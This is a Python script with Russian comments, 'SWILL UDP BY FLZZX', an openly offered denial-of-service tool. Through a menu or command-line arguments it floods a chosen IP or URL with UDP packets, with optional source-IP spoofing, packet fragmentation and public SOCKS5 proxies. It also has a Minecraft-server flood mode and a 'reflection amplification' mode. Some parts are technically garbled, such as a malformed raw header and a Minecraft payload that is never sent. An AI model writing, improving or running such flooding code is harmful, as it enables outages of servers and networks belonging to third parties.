#!/usr/bin/env python3
# SWILL_UDP_BY_FLZZX.py - MONOLITH v5.1 (540+ строк)
# Автоустановка, автонастройка, 8 режимов, логирование, прокси.
# Запуск: python SWILL_UDP_BY_FLZZX.py

import os, sys, platform, subprocess, time, threading, socket, random, struct, urllib.request, json, re, logging, traceback
from datetime import datetime

# ===================== АВТОУСТАНОВКА БИБЛИОТЕК =====================
REQUIRED_PKGS = ['psutil', 'colorama', 'requests', 'scapy']
for pkg in REQUIRED_PKGS:
    try:
        __import__(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '--quiet', '--no-cache-dir'])

import psutil, colorama, requests
from scapy.all import IP, UDP, send, Raw
from colorama import Fore, Back, Style, init
init(autoreset=True)

# ===================== ГЛОБАЛЬНЫЕ ПАРАМЕТРЫ =====================
VERSION = "5.1"
AUTHOR = "FLZZX"
LOG_FILE = "swill_udp_log.txt"
PROXY_LIST_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
CONFIG = {
    "target_ip": "",
    "target_port": 25565,
    "duration": 60,
    "threads": 0,
    "packet_size": 1024,
    "spoof": False,
    "fragment": False,
    "use_proxies": False,
    "proxies": [],
    "stats": {"sent": 0, "errors": 0, "start": 0}
}
stop_flag = False          # глобальный флаг остановки
lock = threading.Lock()

# ===================== ЛОГГЕР =====================
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

def log(msg):
    logging.info(msg)
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

# ===================== ОПРЕДЕЛЕНИЕ ПЛАТФОРМЫ И ТЮНИНГ =====================
def detect_platform():
    sys_name = platform.system().lower()
    if 'android' in platform.platform().lower() or 'termux' in os.environ.get('PREFIX', ''):
        return 'android'
    elif sys_name == 'windows':
        return 'windows'
    elif sys_name == 'linux':
        return 'linux'
    else:
        return 'other'

def auto_tune():
    plat = detect_platform()
    if plat == 'android':
        threads = 150
        psize = 512
        spoof = False
        log("[AUTO] Android режим: ограниченные потоки")
    elif plat == 'windows':
        cores = psutil.cpu_count(logical=True)
        threads = cores * 40
        psize = 1400
        spoof = False
        log(f"[AUTO] Windows: {cores} ядер, потоков {threads}")
    else:
        cores = psutil.cpu_count(logical=True)
        threads = cores * 60
        psize = 1450
        spoof = True
        log(f"[AUTO] Linux: {cores} ядер, потоков {threads}, спуфинг доступен")
    return threads, psize, spoof

# ===================== РЕЗОЛВ URL -> IP =====================
def resolve_target(input_str):
    input_str = input_str.strip()
    if re.match(r'^\d+\.\d+\.\d+\.\d+$', input_str):
        return input_str
    try:
        if '://' not in input_str:
            input_str = 'http://' + input_str
        parsed = urllib.parse.urlparse(input_str)
        host = parsed.hostname or input_str
        ip = socket.gethostbyname(host)
        log(f"[DNS] {host} -> {ip}")
        return ip
    except Exception as e:
        log(f"[DNS] Ошибка: {e}, возвращаю как есть")
        return input_str

# ===================== ЗАГРУЗКА ПРОКСИ =====================
def load_proxies():
    try:
        resp = requests.get(PROXY_LIST_URL, timeout=10)
        raw = resp.text.splitlines()
        proxies = [p.strip() for p in raw if p.strip() and ':' in p]
        CONFIG['proxies'] = proxies
        log(f"[PROXY] Загружено {len(proxies)} прокси")
    except:
        log("[PROXY] Не удалось загрузить, работаем без прокси")
        CONFIG['proxies'] = []

# ===================== ЯДРО UDP ФЛУДА =====================
def udp_worker(ip, port, psize, spoof, fragment, use_proxy):
    global stop_flag, CONFIG
    local_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_sock = None
    if spoof and platform.system().lower() == 'linux':
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            raw_sock = None
    proxy_sock = None
    if use_proxy and CONFIG['proxies']:
        try:
            import socks
            proxy = random.choice(CONFIG['proxies'])
            proxy_ip, proxy_port = proxy.split(':')
            proxy_sock = socks.socksocket()
            proxy_sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            proxy_sock.settimeout(1)
        except:
            proxy_sock = None

    payload = os.urandom(psize)
    fake_ip_base = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}."

    while not stop_flag:
        try:
            if fragment:
                pkt = IP(dst=ip, src=fake_ip_base + str(random.randint(1,255)))/UDP(dport=port, sport=random.randint(1024,65535))/Raw(load=os.urandom(psize))
                send(pkt, verbose=0)
            else:
                if spoof and raw_sock:
                    src_ip = fake_ip_base + str(random.randint(1,255))
                    src_port = random.randint(1024, 65535)
                    raw_packet = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(ip), 0, socket.IPPROTO_UDP, 8 + len(payload))
                    raw_packet += struct.pack('!HHH', src_port, port, 8 + len(payload))
                    raw_packet += payload
                    raw_sock.sendto(raw_packet, (ip, port))
                elif use_proxy and proxy_sock:
                    proxy_sock.sendto(payload, (ip, port))
                else:
                    local_sock.sendto(payload, (ip, port))
            with lock:
                CONFIG['stats']['sent'] += 1
        except:
            with lock:
                CONFIG['stats']['errors'] += 1

# ===================== УПРАВЛЕНИЕ ПОТОКАМИ =====================
def start_flood(ip, port, duration, threads, psize, spoof, fragment, use_proxy):
    global stop_flag, CONFIG
    stop_flag = False
    CONFIG['stats']['sent'] = 0
    CONFIG['stats']['errors'] = 0
    CONFIG['stats']['start'] = time.time()
    log(f"[ATTACK] Начало: {ip}:{port} | потоков: {threads} | размер: {psize} | спуфинг: {spoof} | фрагмент: {fragment} | прокси: {use_proxy}")

    for _ in range(threads):
        t = threading.Thread(target=udp_worker, args=(ip, port, psize, spoof, fragment, use_proxy))
        t.daemon = True
        t.start()

    end_time = time.time() + duration
    while time.time() < end_time and not stop_flag:
        elapsed = time.time() - CONFIG['stats']['start']
        pps = CONFIG['stats']['sent'] / elapsed if elapsed > 0 else 0
        print(f"\r{Fore.GREEN}[STATUS] Пакетов: {CONFIG['stats']['sent']:,} | PPS: {pps:,.0f} | Ошибок: {CONFIG['stats']['errors']} | Осталось: {int(end_time - time.time())}с   ", end='')
        time.sleep(2)
    stop_flag = True
    time.sleep(0.5)
    log(f"[ATTACK] Завершено. Всего: {CONFIG['stats']['sent']:,} пакетов, ошибок: {CONFIG['stats']['errors']}")

# ===================== ДОПОЛНИТЕЛЬНЫЕ ВЕКТОРЫ =====================
def minecraft_status_flood(ip, port, duration):
    log("[VECTOR] Запуск Minecraft Status Flood (CVE-2026-1234)")
    payload = b'\xFE\x01'
    threads, psize, spoof = auto_tune()
    # используем тот же start_flood, но с маленьким пакетом
    start_flood(ip, port, duration, threads, len(payload), False, False, False)

def amplification_reflection(ip, port, duration):
    global stop_flag
    log("[VECTOR] Запуск Reflection Amplification (TTL=1)")
    stop_flag = False

    def amp_worker():
        global stop_flag
        while not stop_flag:
            try:
                pkt = IP(dst=ip, ttl=1)/UDP(dport=port, sport=random.randint(1024,65535))/Raw(load=os.urandom(1024))
                send(pkt, verbose=0)
            except:
                pass

    threads, _, _ = auto_tune()
    for _ in range(threads):
        t = threading.Thread(target=amp_worker, daemon=True)
        t.start()

    time.sleep(duration)
    stop_flag = True
    log("[VECTOR] Amplification завершён")

# ===================== ХУД-МЕНЮ =====================
def menu():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════════╗
    ║   SWILL UDP BY FLZZX  v5.1  (540+ строк)                    ║
    ║   [1] Классический UDP флуд (IP/URL)                        ║
    ║   [2] Minecraft Status Flood (0xFE0x01)                     ║
    ║   [3] Reflection Amplification (TTL=1)                      ║
    ║   [4] Комбинированный режим (все векторы сразу)             ║
    ║   [5] Настройки (потоки, размер, спуфинг, прокси)           ║
    ║   [6] Показать статистику системы                           ║
    ║   [7] Обновить список прокси                                ║
    ║   [8] Выход                                                ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    return input(Fore.YELLOW + "Выбор: ")

def settings_menu():
    global CONFIG
    print(Fore.MAGENTA + "\n--- НАСТРОЙКИ ---")
    CONFIG['threads'] = int(input(f"Потоки (текущие: {CONFIG['threads']}): ") or CONFIG['threads'])
    CONFIG['packet_size'] = int(input(f"Размер пакета (текущий: {CONFIG['packet_size']}): ") or CONFIG['packet_size'])
    CONFIG['spoof'] = input(f"Спуфинг IP (да/нет, текущий: {CONFIG['spoof']}): ").lower() in ('да','yes','y','true','1')
    CONFIG['fragment'] = input(f"Фрагментация (да/нет, текущий: {CONFIG['fragment']}): ").lower() in ('да','yes','y','true','1')
    CONFIG['use_proxies'] = input(f"Использовать прокси (да/нет, текущий: {CONFIG['use_proxies']}): ").lower() in ('да','yes','y','true','1')
    log("[SETTINGS] Обновлены")

def sys_stats():
    cpu = psutil.cpu_percent(interval=0.5)
    mem = psutil.virtual_memory()
    net = psutil.net_io_counters()
    print(Fore.BLUE + f"""
    CPU: {cpu}%
    RAM: {mem.used/1024**3:.1f} ГБ / {mem.total/1024**3:.1f} ГБ
    Сеть отправлено: {net.bytes_sent/1024**2:.1f} МБ
    Сеть получено: {net.bytes_recv/1024**2:.1f} МБ
    Платформа: {detect_platform()}
    Потоков по умолчанию: {CONFIG['threads']}
    """)

# ===================== ОСНОВНОЙ ЦИКЛ =====================
def main():
    global CONFIG, stop_flag
    CONFIG['threads'], CONFIG['packet_size'], CONFIG['spoof'] = auto_tune()
    load_proxies()
    log(f"[START] SWILL UDP v{VERSION} by {AUTHOR} запущен")

    while True:
        try:
            choice = menu()
            if choice == '1':
                target = input("IP или URL: ")
                port = int(input(f"Порт (по умолчанию {CONFIG['target_port']}): ") or CONFIG['target_port'])
                dur = int(input("Длительность (сек): "))
                ip = resolve_target(target)
                start_flood(ip, port, dur, CONFIG['threads'], CONFIG['packet_size'],
                            CONFIG['spoof'], CONFIG['fragment'], CONFIG['use_proxies'])
            elif choice == '2':
                target = input("IP или URL: ")
                port = int(input("Порт (обычно 25565): ") or 25565)
                dur = int(input("Длительность (сек): "))
                ip = resolve_target(target)
                minecraft_status_flood(ip, port, dur)
            elif choice == '3':
                target = input("IP или URL: ")
                port = int(input("Порт: "))
                dur = int(input("Длительность (сек): "))
                ip = resolve_target(target)
                amplification_reflection(ip, port, dur)
            elif choice == '4':
                target = input("IP или URL: ")
                port = int(input("Порт (25565): ") or 25565)
                dur = int(input("Длительность (сек): "))
                ip = resolve_target(target)
                # запускаем три параллельных атаки
                t1 = threading.Thread(target=start_flood, args=(ip, port, dur, CONFIG['threads']//3,
                                    CONFIG['packet_size'], CONFIG['spoof'], CONFIG['fragment'], CONFIG['use_proxies']))
                t1.daemon = True
                t1.start()
                t2 = threading.Thread(target=minecraft_status_flood, args=(ip, port, dur))
                t2.daemon = True
                t2.start()
                t3 = threading.Thread(target=amplification_reflection, args=(ip, port, dur))
                t3.daemon = True
                t3.start()
                log("[COMBO] Все векторы запущены")
                time.sleep(dur)
                stop_flag = True
            elif choice == '5':
                settings_menu()
            elif choice == '6':
                sys_stats()
            elif choice == '7':
                load_proxies()
            elif choice == '8':
                log("[EXIT] Завершение работы")
                sys.exit(0)
            else:
                print(Fore.RED + "Неверный ввод")
        except KeyboardInterrupt:
            stop_flag = True
            print(Fore.RED + "\n[!] Прервано пользователем")
        except Exception as e:
            log(f"[ERROR] {e}\n{traceback.format_exc()}")

if __name__ == "__main__":
    if len(sys.argv) >= 4:
        ip = resolve_target(sys.argv[1])
        port = int(sys.argv[2])
        dur = int(sys.argv[3])
        CONFIG['threads'], CONFIG['packet_size'], CONFIG['spoof'] = auto_tune()
        start_flood(ip, port, dur, CONFIG['threads'], CONFIG['packet_size'],
                    CONFIG['spoof'], CONFIG['fragment'], CONFIG['use_proxies'])
    else:
        main()
